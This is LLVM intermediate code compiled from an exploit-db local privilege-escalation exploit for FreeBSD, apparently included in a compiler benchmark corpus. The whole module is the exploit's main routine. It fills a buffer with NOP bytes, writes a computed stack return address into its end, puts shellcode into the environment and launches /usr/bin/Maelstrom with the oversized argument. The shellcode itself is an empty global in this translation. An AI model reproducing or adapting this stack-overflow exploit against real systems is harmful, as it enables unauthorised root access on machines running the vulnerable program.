; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_22614.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_22614.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@bufsize = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [19 x i8] c"/usr/bin/Maelstrom\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"-server\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"HOME=/root\00", align 1
@shellcode = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca [4 x i8*], align 16
  %9 = alloca [3 x i8*], align 16
  %10 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @bufsize, align 4
  %12 = add nsw i32 %11, 1
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %6, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %7, align 8
  %16 = getelementptr inbounds [4 x i8*], [4 x i8*]* %8, i64 0, i64 0
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0), i8** %16, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 1
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8** %17, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 1
  store i8* %15, i8** %18, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 1
  store i8* null, i8** %19, align 8
  %20 = getelementptr inbounds [3 x i8*], [3 x i8*]* %9, i64 0, i64 0
  store i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i8** %20, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** @shellcode, align 8
  store i8* %22, i8** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %21, i64 1
  store i8* null, i8** %23, align 8
  %24 = getelementptr inbounds [4 x i8*], [4 x i8*]* %8, i64 0, i64 0
  %25 = load i8*, i8** %24, align 16
  %26 = call i32 @strlen(i8* %25)
  %27 = sext i32 %26 to i64
  %28 = sub i64 3221225464, %27
  %29 = load i8*, i8** @shellcode, align 8
  %30 = call i32 @strlen(i8* %29)
  %31 = sext i32 %30 to i64
  %32 = sub i64 %28, %31
  %33 = sub i64 %32, 2
  store i64 %33, i64* %10, align 8
  %34 = load i32, i32* @bufsize, align 4
  %35 = call i32 @memset(i8* %15, i32 144, i32 %34)
  %36 = call i32 @memset(i8* %15, i32 50, i32 2)
  %37 = getelementptr inbounds i8, i8* %15, i64 1
  %38 = call i32 @memset(i8* %37, i32 64, i32 2)
  %39 = load i32, i32* @bufsize, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 %40, 8
  %42 = getelementptr inbounds i8, i8* %15, i64 %41
  %43 = call i32 @memcpy(i8* %42, i64* %10, i32 8)
  %44 = load i32, i32* @bufsize, align 4
  %45 = sext i32 %44 to i64
  %46 = sub i64 %45, 16
  %47 = getelementptr inbounds i8, i8* %15, i64 %46
  %48 = call i32 @memcpy(i8* %47, i64* %10, i32 8)
  %49 = load i32, i32* @bufsize, align 4
  %50 = sext i32 %49 to i64
  %51 = sub i64 %50, 24
  %52 = getelementptr inbounds i8, i8* %15, i64 %51
  %53 = call i32 @memcpy(i8* %52, i64* %10, i32 8)
  %54 = load i32, i32* @bufsize, align 4
  %55 = sext i32 %54 to i64
  %56 = sub i64 %55, 32
  %57 = getelementptr inbounds i8, i8* %15, i64 %56
  %58 = call i32 @memcpy(i8* %57, i64* %10, i32 8)
  %59 = load i32, i32* @bufsize, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %15, i64 %60
  store i8 0, i8* %61, align 1
  %62 = getelementptr inbounds [4 x i8*], [4 x i8*]* %8, i64 0, i64 0
  %63 = load i8*, i8** %62, align 16
  %64 = getelementptr inbounds [4 x i8*], [4 x i8*]* %8, i64 0, i64 0
  %65 = getelementptr inbounds [3 x i8*], [3 x i8*]* %9, i64 0, i64 0
  %66 = call i32 @execve(i8* %63, i8** %64, i8** %65)
  store i32 0, i32* %3, align 4
  %67 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %67)
  %68 = load i32, i32* %3, align 4
  ret i32 %68
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i64*, i32) #2

declare dso_local i32 @execve(i8*, i8**, i8**) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
